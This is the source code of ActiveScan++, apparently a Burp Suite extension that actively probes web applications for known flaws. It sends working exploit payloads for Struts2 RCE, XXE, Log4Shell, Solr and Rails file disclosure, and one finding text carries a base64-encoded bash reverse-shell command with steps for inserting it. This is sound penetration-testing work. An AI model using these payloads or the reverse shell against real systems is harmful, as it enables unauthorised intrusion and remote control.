# Author: James Kettle <albinowax+acz@gmail.com>
# Copyright 2014 Context Information Security up to 1.0.5
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
try:
    import pickle
    import random
    import re
    import string
    import time
    import copy
    import base64
    import jarray
    import traceback
    from string import Template
    from cgi import escape

    from burp import IBurpExtender, IScannerInsertionPointProvider, IScannerInsertionPoint, IParameter, IScannerCheck, \
        IScanIssue
    import jarray
except ImportError:
    print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."

VERSION = "1.0.23"
FAST_MODE = False
DEBUG = False
callbacks = None
helpers = None

def safe_bytes_to_string(bytes):
    if bytes is None:
        bytes = ''
    return helpers.bytesToString(bytes)

def html_encode(string):
    return string.replace("<", "&lt;").replace(">", "&gt;")

class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, this_callbacks):
        global callbacks, helpers
        callbacks = this_callbacks
        helpers = callbacks.getHelpers()
        callbacks.setExtensionName("activeScan++")

        # gracefully skip checks requiring Collaborator if it's disabled
        collab_enabled = True
        if '"type":"none"' in callbacks.saveConfigAsJson("project_options.misc.collaborator_server"):
            collab_enabled = False
            print "Collaborator not enabled; skipping checks that require it"
        
        callbacks.registerScannerCheck(PerHostScans())
        callbacks.registerScannerCheck(PerRequestScans())
        callbacks.registerScannerInsertionPointProvider(BasicAuthInsertionPointProvider(callbacks))

        if not FAST_MODE:
            callbacks.registerScannerCheck(CodeExec())
            callbacks.registerScannerCheck(SuspectTransform())
            callbacks.registerScannerCheck(JetLeak())
            callbacks.registerScannerCheck(SimpleFuzz())
            callbacks.registerScannerCheck(EdgeSideInclude())
            if collab_enabled:
                callbacks.registerScannerCheck(Log4j())
                callbacks.registerScannerCheck(Solr())
                callbacks.registerScannerCheck(doStruts_2017_12611_scan())

        print "Successfully loaded activeScan++ v" + VERSION

        return


class PerHostScans(IScannerCheck):
    scanned_hosts = set()

    def doPassiveScan(self, basePair):
        return []

    def doActiveScan(self, basePair, insertionPoint):
        host = basePair.getHttpService().getHost()
        if host in self.scanned_hosts:
            return []

        self.scanned_hosts.add(host)
        issues = []
        issues.extend(self.interestingFileScan(basePair))
        return issues


    interestingFileMappings = [
        # [host-relative-url, vulnerable_response_content, reason]
        ['/.git/config', '[core]', 'source code leak?'],
        ['/server-status', 'Server uptime', 'debug info'],
        ['/.well-known/apple-app-site-association', 'applinks', 'https://developer.apple.com/library/archive/documentation/General/Conceptual/AppSearch/UniversalLinks.html'],
        ['/.well-known/openid-configuration', '"authorization_endpoint"', 'https://portswigger.net/research/hidden-oauth-attack-vectors'],
        ['/.well-known/oauth-authorization-server', '"authorization_endpoint"', 'https://portswigger.net/research/hidden-oauth-attack-vectors'],
    ]


    def interestingFileScan(self, basePair):
        issues = []
        for (url, expect, reason) in self.interestingFileMappings:
            attack = self.fetchURL(basePair, url)
            if expect in safe_bytes_to_string(attack.getResponse()):

                # prevent false positives by tweaking the URL and confirming the expected string goes away
                baseline = self.fetchURL(basePair, url[:-1])
                if expect not in safe_bytes_to_string(baseline.getResponse()):
                    issues.append(
                        CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(attack).getUrl(),
                                        [attack, baseline],
                                        'Interesting response',
                                        "The response to <b>"+html_encode(url)+"</b> contains <b>'"+html_encode(expect)+"'</b><br/><br/>This may be interesting. Here's a clue why: <b>"+html_encode(reason)+"</b>",
                                        'Firm', 'Information')
                    )


        return issues


    def fetchURL(self, basePair, url):
        path = helpers.analyzeRequest(basePair).getUrl().getPath()
        newReq = safe_bytes_to_string(basePair.getRequest()).replace(path, url, 1)
        return callbacks.makeHttpRequest(basePair.getHttpService(), newReq)



class PerRequestScans(IScannerCheck):

    def __init__(self):
        self.scan_checks = [
            self.doHostHeaderScan,
            self.doCodePathScan,
            self.doStrutsScan,
            self.doStruts_2017_9805_Scan,
            self.doStruts_2018_11776_Scan,
            self.doXXEPostScan,
            self.doRailsScan,
        ]

    def doPassiveScan(self, basePair):
        return []

    def doActiveScan(self, basePair, insertionPoint):
        if not self.should_trigger_per_request_attacks(basePair, insertionPoint):
            return []

        issues = []
        for scan_check in self.scan_checks:
            try:
                issues.extend(scan_check(basePair))
            except Exception:
                print 'Error executing PerRequestScans.'+scan_check.__name__+': '
                print(traceback.format_exc())

        return issues

    def should_trigger_per_request_attacks(self, basePair, insertionPoint):
        request = helpers.analyzeRequest(basePair.getRequest())
        params = request.getParameters()

        # if there are no parameters, scan if there's a HTTP header
        if params:
            # pick the parameter most likely to be the first insertion point
            first_parameter_offset = 999999
            first_parameter = None
            for param_type in (IParameter.PARAM_BODY, IParameter.PARAM_URL, IParameter.PARAM_JSON, IParameter.PARAM_XML, IParameter.PARAM_XML_ATTR, IParameter.PARAM_MULTIPART_ATTR, IParameter.PARAM_COOKIE):
                for param in params:
                    if param.getType() != param_type:
                        continue
                    if param.getNameStart() < first_parameter_offset:
                        first_parameter_offset = param.getNameStart()
                        first_parameter = param
                if first_parameter:
                    break

            if first_parameter and first_parameter.getName() == insertionPoint.getInsertionPointName():
                return True

        elif insertionPoint.getInsertionPointType() == IScannerInsertionPoint.INS_HEADER and insertionPoint.getInsertionPointName() == 'User-Agent':
            return True

        return False

    def doRailsScan(self, basePair):
        if '127.0.0.1' in safe_bytes_to_string(basePair.getResponse()):
            return

        (ignore, req) = setHeader(basePair.getRequest(), 'Accept', '../../../../../../../../../../../../../e*c/h*s*s{{', True)
        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req)
        response = safe_bytes_to_string(attack.getResponse())
        body_delim = '\r\n\r\n'
        if body_delim in response and '127.0.0.1' in response.split(body_delim, 1)[1]:
            # avoid false positives caused by burp's own scanchecks containing '127.0.0.1'
            try:
                collabLocation = callbacks.createBurpCollaboratorClientContext().getCollaboratorServerLocation()
                if collabLocation in safe_bytes_to_string(attack.getResponse()):
                    return []
            except Exception:
                pass

            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                [attack],
                'Rails file disclosure',
                "The application appears to be vulnerable to CVE-2019-5418, enabling arbitrary file disclosure.",
                'Firm', 'High')]
        return []

    def doStrutsScan(self, basePair):

        x = random.randint(999, 9999)
        y = random.randint(999, 9999)
        (ignore, req) = setHeader(basePair.getRequest(), 'Content-Type', "${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"X-Ack\","+str(x)+"*"+str(y)+")}.multipart/form-data", True)
        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req)

        if str(x*y) in '\n'.join(helpers.analyzeResponse(attack.getResponse()).getHeaders()):
            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                [attack],
                'Struts2 RCE',
                "The application appears to be vulnerable to CVE-2017-5638, enabling arbitrary code execution.",
                'Firm', 'High')]

        return []


# Based on exploit at https://github.com/chrisjd20/cve-2017-9805.py
# Tested against https://dev.northpolechristmastown.com/orders.xhtml (SANS Holiday Hack Challenge 2017)
# Tested against system at https://pentesterlab.com/exercises/s2-052
    def doStruts_2017_9805_Scan(self, basePair):
        if '"type":"none"' in callbacks.saveConfigAsJson("project_options.misc.collaborator_server"):
            return []

        global callbacks, helpers

        collab = callbacks.createBurpCollaboratorClientContext()
        collab_payload =collab.generatePayload(True)

        param_pre = '<?xml version="1.0" encoding="utf8"?><map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><is class="javax.crypto.CipherInputStream"><cipher class="javax.crypto.NullCipher"><initialized>false</initialized><opmode>0</opmode><serviceIterator class="javax.imageio.spi.FilterIterator"><iter class="javax.imageio.spi.FilterIterator"><iter class="java.util.Collections$EmptyIterator"/><next class="java.lang.ProcessBuilder"><command><string>'
        param_post = '</string></command><redirectErrorStream>false</redirectErrorStream></next></iter><filter class="javax.imageio.ImageIO$ContainsFilter"><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>foo</name></filter><next class="string">foo</next></serviceIterator><lock/></cipher><input class="java.lang.ProcessBuilder$NullInputStream"/><ibuffer/><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry><entry><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>'

        command = "ping</string><string>" + collab_payload + "</string><string>-c1" # platform-agnostic command to check for RCE via DNS interaction

        # print ("\nCommand is: "+command)
        # whole_param = helpers.buildParameter('body',param_pre + command + param_post,IParameter.PARAM_BODY)
        whole_param = param_pre + command + param_post
        # print ('*** The following parameter will be sent:\n\n' + whole_param)

        (ignore, req) = setHeader(basePair.getRequest(), 'Content-Type', "application/xml", True) # application/xml seems to work better with Struts while text/xml seems to work better for XXE
        (ignore, req) = setHeader(req, 'Content-Length', str(len(whole_param)), True)

        ascii_req = '' # Make a copy of the request (byte array) into a string for easier analysis
        for byte in req:
            ascii_req += chr(byte)

        if ascii_req.find('\r\n\r\n') > 1: # If 
            req = req[:ascii_req.find('\r\n\r\n')+4] # strip off any existing message body
        elif ascii_req.find('\n\n') > 1:
            req = req[:ascii_req.find('\n\n')+2] # strip off any existing message body

        for chars in whole_param: # Append the payload to the request
            req.append(ord(chars))

        if req[0] == 71:    # if the reqest starts with G(ET)
            req = req[3:]    # trim GET
            i = 0
            for b in [80,79,83,84]:  # and insert POST
                req.insert(i,b)
                i += 1

        ascii_req = ''
        for byte in req:
            ascii_req += chr(byte)
        debug_msg('  The outgoing Struts_2017_9805 request looks like:\n\n' + ascii_req + '\n')

        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req) # Issue the actual request
        interactions = collab.fetchAllCollaboratorInteractions() # Check for collaboration

        if interactions:
            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                [attack],
                'Struts2 CVE-2017-9805 RCE',
                "The application appears to be vulnerable to CVE-2017-9805, enabling arbitrary code execution. For POC or reverse shell, write a command, put it in Base64 (to keep special chars from breaking XML), and change the nslookup chunk to something like:\n\n'/bin/bash</string><string>-c</string><string>echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tfaXAvYXR0YWNrX3BvcnQgMD4mMQ== | base64 -d | tee -a /tmp/.deleteme.tmp ; /bin/bash /tmp/.deleteme.tmp ; /bin/rm /tmp/.deleteme.tmp'",
                'Firm', 'High')]

        return []

    
# Based on vulnerability discovered by Man Yue Mo: https://lgtm.com/blog/apache_struts_CVE-2018-11776
# Tested against instance set up like https://github.com/xfox64x/CVE-2018-11776
    def doStruts_2018_11776_Scan(self, basePair):

        # Don't bother if it isn't a 302 response
        origResponse = safe_bytes_to_string(basePair.getResponse())
        if (origResponse.find('302 Found') < 0):
            return[]
        
        path = helpers.analyzeRequest(basePair).getUrl().getPath()
        last_slash = 0
        # The exploit depends upon injecting OGNL into the path of a vulnerable action, so we find
        #the last slash in the URL and insert our payload
        for i in range(len(path)):
            if path[i] == '/':
                last_slash = i

        x = random.randint(999, 9999)
        y = random.randint(999, 9999)
        # The payload here is a simple math(s) problem - because multiplication platform-agnostic
        attack_string = "/$%7B("+str(x)+"*"+str(y)+")%7D"
        attack_path = path[:last_slash]+attack_string+path[last_slash:]

        newReq = safe_bytes_to_string(basePair.getRequest()).replace(path,attack_path, 1)
        debug_msg('  The outgoing 2018-11776 request looks like:\n\n' + newReq + '\n')
        attack = callbacks.makeHttpRequest(basePair.getHttpService(), newReq) # Issue the actual request
        asciiResponse = "".join(map(chr,attack.getResponse()))

        # If the response includes the payload product, system is vulnerable
        if str(x*y) in asciiResponse:
            # Add highlighting so the factors (request) and product (response) are easy to identify
            requestMarkers = [jarray.array([newReq.find(str(x)+'*'+str(y)), newReq.find(str(x)+'*'+str(y))
                + len(str(x)+'*'+str(y))],'i')]
            responseMarkers = [jarray.array([asciiResponse.find(str(x*y)), asciiResponse.find(str(x*y)) +
                len(str(x*y))],'i')]
            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                [callbacks.applyMarkers(attack, requestMarkers, responseMarkers)],
                'Struts2 CVE-2018-11776 RCE',
                "The application appears to be vulnerable to CVE-2018-11776, enabling arbitrary code execution.",
                'Firm', 'High')]

        return []



# Based on the plethora of XXE attacks at https://web-in-security.blogspot.it/2016/03/xxe-cheat-sheet.html
# Tested against https://pentesterlab.com/exercises/play_xxe
    def doXXEPostScan(self, basePair):
        if '"type":"none"' in callbacks.saveConfigAsJson("project_options.misc.collaborator_server"):
            return []

        global callbacks, helpers

        collab = callbacks.createBurpCollaboratorClientContext()
        collab_payload =collab.generatePayload(True)

        xxepayload = '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE data SYSTEM "http://' + collab_payload + '/scanner.dtd"><data>&all;</data>'

        (ignore, req) = setHeader(basePair.getRequest(), 'Content-Type', "text/xml", True)
        (ignore, req) = setHeader(req, 'Content-Length', str(len(xxepayload)), True)

        ascii_req = '' # make a copy of the request in ASCII for easier processing
        for byte in req:
            ascii_req += chr(byte)

        if ascii_req.find('\r\n\r\n') > 1:
            # print('Found \\r\\n\\r\\n at position '+str(ascii_req.find('\r\n\r\n'))+'; stripping all after\n')
            req = req[:ascii_req.find('\r\n\r\n')+4] # strip off any existing message body
        elif ascii_req.find('\n\n') > 1:
            # print('Found \\n\\n at position '+str(ascii_req.find('\n\n'))+'; stripping all after\n')
            req = req[:ascii_req.find('\n\n')+2] # strip off any existing message body

        for chars in xxepayload: # add the payload as the message body
            req.append(ord(chars))

        if req[0] == 71:        # if the reqest starts with G(ET)
            req = req[3:]    # trim GET...
            i = 0
            for b in [80,79,83,84]:    # and slip in POST
                req.insert(i,b)
                i += 1

        ascii_req = '' # recreate the ASCII request for output to Extender console
        for byte in req:
            ascii_req += chr(byte)
        debug_msg('  The outgoing XXEPostScan request looks like:\n\n' + ascii_req + '\n')

        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req) # Issue the actual request
        interactions = collab.fetchAllCollaboratorInteractions() # Check for collaboration

        if interactions:
            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                [attack],
                'XXE via POST Request',
                "The application appears to be vulnerable to standard XML eXternal Entity (XXE) via a crafted POST request.  Check the following URL for various method/payload choices:  https://web-in-security.blogspot.it/2016/03/xxe-cheat-sheet.html",
                'Firm', 'High')]

        return []



    def doCodePathScan(self, basePair):
        base_resp_string = safe_bytes_to_string(basePair.getResponse())
        base_resp_print = tagmap(base_resp_string)
        xml_resp, xml_req = self._codepath_attack(basePair, 'application/xml')
        if xml_resp != -1:
            if xml_resp != base_resp_print:
                zml_resp, zml_req = self._codepath_attack(basePair, 'application/zml')
                assert zml_resp != -1
                if zml_resp != xml_resp:
                    # Trigger a passive scan on the new response for good measure
                    launchPassiveScan(xml_req)
                    return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                                            [basePair, xml_req, zml_req],
                                            'XML input supported',
                                            "The application appears to handle application/xml input. Consider investigating whether it's vulnerable to typical XML parsing attacks such as XXE.",
                                            'Tentative', 'Information')]

        return []

    def _codepath_attack(self, basePair, content_type):
        modified, request = setHeader(basePair.getRequest(), 'Content-Type', content_type)
        if not modified:
            return -1, None
        result = callbacks.makeHttpRequest(basePair.getHttpService(), request)
        resp = result.getResponse()
        if resp is None:
            resp = ''
        return tagmap(safe_bytes_to_string(resp)), result

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        return is_same_issue(existingIssue, newIssue)

    def doHostHeaderScan(self, basePair):

        base_resp_string = safe_bytes_to_string(basePair.getResponse())
        base_resp_print = tagmap(base_resp_string)
        rawHeaders = helpers.analyzeRequest(basePair.getRequest()).getHeaders()

        # Parse the headers into a dictionary
        headers = dict((header.split(': ')[0].upper(), header.split(': ', 1)[1]) for header in rawHeaders[1:])

        # If the request doesn't use the host header, bail
        if ('HOST' not in headers.keys()):
            return []

        # If the response doesn't reflect the host header we can't identify successful attacks
        if (headers['HOST'] not in base_resp_string):
            debug_msg("Skipping host header attacks on this request as the host isn't reflected")
            return []

        # prepare the attack
        request = safe_bytes_to_string(basePair.getRequest())
        request = request.replace('$', '\$')
        request = request.replace('/', '$abshost/', 1)

        # add a cachebust parameter
        if ('?' in request[0:request.index('\n')]):
            request = re.sub('(?i)([a-z]+ [^ ]+)', r'\1&cachebust=${cachebust}', request, 1)
        else:
            request = re.sub('(?i)([a-z]+ [^ ]+)', r'\1?cachebust=${cachebust}', request, 1)

        request = re.sub('(?im)^Host: [a-zA-Z0-9-_.:]*', 'Host: ${host}${xfh}', request, 1)
        if ('REFERER' in rawHeaders):
            request = re.sub('(?im)^Referer: http[s]?://[a-zA-Z0-9-_.:]*', 'Referer: ${referer}', request, 1)

        if ('CACHE-CONTROL' in rawHeaders):
            request = re.sub('(?im)^Cache-Control: [^\r\n]+', 'Cache-Control: no-cache', request, 1)
        else:
            request = request.replace('Host: ${host}${xfh}', 'Host: ${host}${xfh}\r\nCache-Control: no-cache', 1)

        referer = randstr(6)
        request_template = Template(request)


        # Send several requests with invalid host headers and observe whether they reach the target application, and whether the host header is reflected
        legit = headers['HOST']
        taint = randstr(6)
        taint += '.' + legit
        issues = []

        # Host: evil.legit.com
        (attack, resp) = self._attack(basePair, {'host': taint}, taint, request_template, referer)
        if hit(resp, base_resp_print):

            # flag DNS-rebinding if the page actually has content
            if base_resp_print != '':
                issues.append(self._raise(basePair, attack, 'dns'))

            if taint in resp and referer not in resp:
                issues.append(self._raise(basePair, attack, 'host'))
                return issues
        else:
            # The application might not be the default VHost, so try an absolute URL:
            #	GET http://legit.com/foo
            #	Host: evil.com
            (attack, resp) = self._attack(basePair, {'abshost': legit, 'host': taint}, taint, request_template, referer)
            if hit(resp, base_resp_print) and taint in resp and referer not in resp:
                issues.append(self._raise(basePair, attack, 'abs'))

        # Host: legit.com
        #	X-Forwarded-Host: evil.com
        (attack, resp) = self._attack(basePair, {'host': legit, 'xfh': taint}, taint, request_template, referer)
        if hit(resp, base_resp_print) and taint in resp and referer not in resp:
            issues.append(self._raise(basePair, attack, 'xfh'))

        return issues

    def _raise(self, basePair, attack, type):
        service = attack.getHttpService()
        url = helpers.analyzeRequest(attack).getUrl()

        if type == 'dns':
            title = 'Arbitrary host header accepted'
            sev = 'Low'
            conf = 'Certain'
            desc = """The application appears to be accessible using arbitrary HTTP Host headers. <br/><br/>

                    This is a serious issue if the application is not externally accessible or uses IP-based access restrictions. Attackers can use DNS Rebinding to bypass any IP or firewall based access restrictions that may be in place, by proxying through their target's browser.<br/>
                    Note that modern web browsers' use of DNS pinning does not effectively prevent this attack. The only effective mitigation is server-side: https://bugzilla.mozilla.org/show_bug.cgi?id=689835#c13<br/><br/>

                    Additionally, it may be possible to directly bypass poorly implemented access restrictions by sending a Host header of 'localhost'.
                    
                    Resources: <br/><ul>
                        <li>https://portswigger.net/web-security/host-header</li>
                    </ul>
                    """
        else:
            title = 'Host header poisoning'
            sev = 'Medium'
            conf = 'Tentative'
            desc = """The application appears to trust the user-supplied host header. By supplying a malicious host header with a password reset request, it may be possible to generate a poisoned password reset link. Consider testing the host header for classic server-side injection vulnerabilities.<br/>
                    <br/>
                    Depending on the configuration of the server and any intervening caching devices, it may also be possible to use this for cache poisoning attacks.<br/>
                    <br/>
                    Resources: <br/><ul>
                        <li>https://portswigger.net/web-security/host-header<br/></li>
                        <li>http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html</li>
                        </ul>
            """

        issue = CustomScanIssue(service, url, [basePair, attack], title, desc, conf, sev)
        return issue

    def _attack(self, basePair, payloads, taint, request_template, referer):
        proto = helpers.analyzeRequest(basePair).getUrl().getProtocol() + '://'
        if 'abshost' in payloads:
            payloads['abshost'] = proto + payloads['abshost']
        payloads['referer'] = proto + taint + '/' + referer

        # Load the supplied payloads into the request
        if 'xfh' in payloads:
            payloads['xfh'] = "\r\nX-Forwarded-Host: " + payloads['xfh']

        for key in ('xfh', 'abshost', 'host', 'referer'):
            if key not in payloads:
                payloads[key] = ''

        # Ensure that the response to our request isn't cached - that could be harmful
        payloads['cachebust'] = str(time.time())

        request = request_template.substitute(payloads)

        attack = callbacks.makeHttpRequest(basePair.getHttpService(), request)

        response = safe_bytes_to_string(attack.getResponse())

        requestHighlights = [jarray.array([m.start(), m.end()], 'i') for m in
                             re.finditer('(' + '|'.join(payloads.values()) + ')',
                                         safe_bytes_to_string(attack.getRequest()))]
        responseHighlights = [jarray.array([m.start(), m.end()], 'i') for m in re.finditer(taint, response)]
        attack = callbacks.applyMarkers(attack, requestHighlights, responseHighlights)
        return attack, response


# Ensure that error pages get passively scanned
# Stacks nicely with the 'Error Message Checks' extension
class SimpleFuzz(IScannerCheck):
    def doActiveScan(self, basePair, insertionPoint):
        attack = request(basePair, insertionPoint, 'a\'a\\\'b"c>?>%}}%%>c<[[?${{%}}cake\\')
        if tagmap(safe_bytes_to_string(attack.getResponse())) != tagmap(safe_bytes_to_string(basePair.getResponse())):
            launchPassiveScan(attack)

        return []

    def doPassiveScan(self, basePair):
        return []


class EdgeSideInclude(IScannerCheck):
    def doPassiveScan(self, basePair):
        return []

    def doActiveScan(self, basePair, insertionPoint):
        canary1 = randstr(4)
        canary2 = randstr(4)
        canary3 = randstr(4)
        probe = canary1+"<!--esi-->"+canary2+"<!--esx-->"+canary3
        attack = request(basePair, insertionPoint, probe)
        resp = safe_bytes_to_string(attack.getResponse())

        expect = canary1+canary2+"<!--esx-->"+canary3
        if expect in resp:
            return [CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
                                            'Edge Side Include' ,
                                            "The application appears to support Edge Side Includes:<br/><br/> "
                                            "The following probe was sent: <b>" + html_encode(probe) +
                                            "</b><br/>In the response, the ESI comment has been stripped: <b>" + html_encode(expect) +
                                            "</b><br/><br/>Refer to https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/ for further information", 'Tentative', 'High')]
        return []



# Detect suspicious input transformations
class SuspectTransform(IScannerCheck):
    def __init__(self):

        self.checks = {
            'quote consumption': self.detect_quote_consumption,
            'arithmetic evaluation': self.detect_arithmetic,
            'expression evaluation': self.detect_expression,
            'template evaluation': self.detect_razor_expression,
            'EL evaluation': self.detect_alt_expression,
        }

        self.confirm_count = 2

    def detect_quote_consumption(self, base):
        return anchor_change("''", ["'"])

    def detect_arithmetic(self, base):
        x = random.randint(99, 9999)
        y = random.randint(99, 9999)
        probe = str(x) + '*' + str(y)
        expect = str(x * y)
        return probe, expect

    def detect_expression(self, base):
        probe, expect = self.detect_arithmetic(base)
        return '${' + probe + '}', expect

    def detect_alt_expression(self, base):
        probe, expect = self.detect_arithmetic(base)
        return '%{' + probe + '}', expect

    def detect_razor_expression(self, base):
        probe, expect = self.detect_arithmetic(base)
        return '@(' + probe + ')', expect

    def doActiveScan(self, basePair, insertionPoint):
        base = insertionPoint.getBaseValue()
        initial_response = safe_bytes_to_string(basePair.getResponse())
        issues = []
        checks = copy.copy(self.checks)
        while checks:
            name, check = checks.popitem()
            for attempt in range(self.confirm_count):
                probe, expect = check(base)
                if isinstance(expect, basestring):
                    expect = [expect]

                debug_msg("Trying " + probe)
                attack = request(basePair, insertionPoint, probe)
                attack_response = safe_bytes_to_string(attack.getResponse())

                matched = False
                for e in expect:
                    if e in attack_response and e not in initial_response:
                        matched = True
                        if attempt == self.confirm_count - 1:
                            issues.append(
                                CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
                                                'Suspicious input transformation: ' + name,
                                                "The application transforms input in a way that suggests it might be vulnerable to some kind of server-side code injection:<br/><br/> "
                                                "The following probe was sent: <b>" + probe +
                                                "</b><br/>The server response contained the evaluated result: <b>" + e +
                                                "</b><br/><br/>Manual investigation is advised.", 'Tentative', 'High'))

                        break

                if not matched:
                    break

        return issues

    def doPassiveScan(self, basePair):
        return []

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        return is_same_issue(existingIssue, newIssue)

# Based on https://github.com/brianwrf/S2-053-CVE-2017-12611
# Tested against docker instance at https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-053
class doStruts_2017_12611_scan(IScannerCheck):
    def doActiveScan(self, basePair, insertionPoint):
        collab = callbacks.createBurpCollaboratorClientContext()

        # set the blah blah blah needed before and after the command to be executed
        param_pre = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"
        param_post = "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
        collab_payload = collab.generatePayload(True) # create a Collaborator payload
        command = "ping " + collab_payload + " -c1" # platform-agnostic command to check for RCE via DNS interaction
        attack_param = param_pre + command + param_post

        attack = request(basePair, insertionPoint, attack_param) # issue the attack request
        debug_msg(helpers.analyzeRequest(attack).getUrl())
        interactions = collab.fetchAllCollaboratorInteractions() # Check for collaboration
        if interactions:
            return [CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
                'Struts2 CVE-2017-12611 RCE',
                "The application appears to be vulnerable to CVE-2017-12611, enabling arbitrary code execution.  Replace the ping command in the suspicious request with system commands for a POC.",
                'Firm', 'High')]
        return []

    def doPassiveScan(self, basePair):
        return []

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        return is_same_issue(existingIssue, newIssue)


class Log4j(IScannerCheck):
    def doActiveScan(self, basePair, insertionPoint):
        collab = callbacks.createBurpCollaboratorClientContext()
        attack = request(basePair, insertionPoint, "${jndi:ldap://"+collab.generatePayload(True)+"/a}")
        interactions = collab.fetchAllCollaboratorInteractions()
        if interactions:
            return [CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
                                    'Log4Shell (CVE-2021-44228)',
                                    "The application appears to be running a version of log4j vulnerable to RCE. ActiveScan++ sent a reference to an external file, and received a pingback from the server.<br/><br/>" +
                                    "To investigate, use the manual collaborator client. It may be possible to escalate this vulnerability into RCE. Please refer to https://www.lunasec.io/docs/blog/log4j-zero-day/ for further information",
                                    'Firm', 'High')]

    def doPassiveScan(self, basePair):
        return []

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        return is_same_issue(existingIssue, newIssue)


class Solr(IScannerCheck):
    def doActiveScan(self, basePair, insertionPoint):
        collab = callbacks.createBurpCollaboratorClientContext()
        obfuscated_payload = "{!xmlparser v='<!DOCTYPE a SYSTEM \"http://"+collab.generatePayload(True)+"/xxe\"><a></a>'}"
        attack = request(basePair, insertionPoint, obfuscated_payload)
        interactions = collab.fetchAllCollaboratorInteractions()
        if interactions:
            return [CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
                                    'Solr XXE/RCE (CVE-2017-12629)',
                                    "The application appears to be running a version of Solr vulnerable to XXE. ActiveScan++ sent a reference to an external file, and received a pingback from the server.<br/><br/>"+
                                    "To investigate, use the manual collaborator client. It may be possible to escalate this vulnerability into RCE. Please refer to https://mail-archives.apache.org/mod_mbox/lucene-dev/201710.mbox/%3CCAJEmKoC%2BeQdP-E6BKBVDaR_43fRs1A-hOLO3JYuemmUcr1R%2BTA%40mail.gmail.com%3E for further information",
                                    'Firm', 'High')]

        return []

    def doPassiveScan(self, basePair):
        return []

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        return is_same_issue(existingIssue, newIssue)

# Detect CVE-2015-2080
# Technique based on https://github.com/GDSSecurity/Jetleak-Testing-Script/blob/master/jetleak_tester.py
class JetLeak(IScannerCheck):
    def doActiveScan(self, basePair, insertionPoint):
        if 'Referer' != insertionPoint.getInsertionPointName():
            return []
        attack = request(basePair, insertionPoint, "\x00")
        resp_start = safe_bytes_to_string(attack.getResponse())[:90]
        if '400 Illegal character 0x0 in state' in resp_start and '<<<' in resp_start:
            return [CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
                                    'CVE-2015-2080 (JetLeak)',
                                    "The application appears to be running a version of Jetty vulnerable to CVE-2015-2080, which allows attackers to read out private server memory<br/>"
                                    "Please refer to http://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html for further information",
                                    'Firm', 'High')]
        return []

    def doPassiveScan(self, basePair):
        return []

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        return is_same_issue(existingIssue, newIssue)


# This extends the active scanner with a number of timing-based code execution checks
# _payloads contains the payloads, designed to delay the response by $time seconds
